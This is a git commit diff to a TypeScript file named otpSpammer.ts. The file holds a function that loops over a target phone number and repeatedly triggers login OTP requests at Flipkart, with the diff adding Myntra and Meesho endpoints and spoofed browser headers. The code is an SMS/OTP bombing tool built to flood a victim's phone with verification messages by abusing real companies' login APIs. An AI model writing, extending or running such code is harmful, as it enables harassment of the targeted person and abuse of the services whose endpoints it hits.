b61a4c8b637336294fe6a4e2b5630ec7d4e72e15
Abhishek Mishra <abhishek81936@gmail.com>
2024-08-20 11:51:14 +0530

    updating

--- api/utils/otpSpammer.ts
+++ api/utils/otpSpammer.ts
@@ -2,6 +2,7 @@ import axios from "axios"
 
 export async function Spammer(target : number) {
     for (let i = 0; i < 10; i++) {
+        //Request to Flipkart
         await axios.post("https://2.rome.api.flipkart.com/api/7/user/otp/generate", {
             loginId: `+91${target}`,
         }, {
@@ -21,6 +22,24 @@ export async function Spammer(target : number) {
                 data : {"user_phone" : `${target}`}
 
             })
-        
+          //Request to Myntra 
+           await axios.post("https://www.myntra.com/gateway/v1/auth/getotp",{
+              headers : {
+                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
+                "Origin": "https://www.myntra.com",
+                "Connection": "keep-alive"
+              },
+              data : {
+             "phoneNumber": `${target}`,
+              "signup": "ONECLICK"
+              }
+           })
+           //Request to Meesho
+           axios.post("https://www.meesho.com/api/v1/user/login/request-otp",{
+             headers : {},
+             data : {
+                "phone_number": `${target}`
+             }
+           })
     }
 }
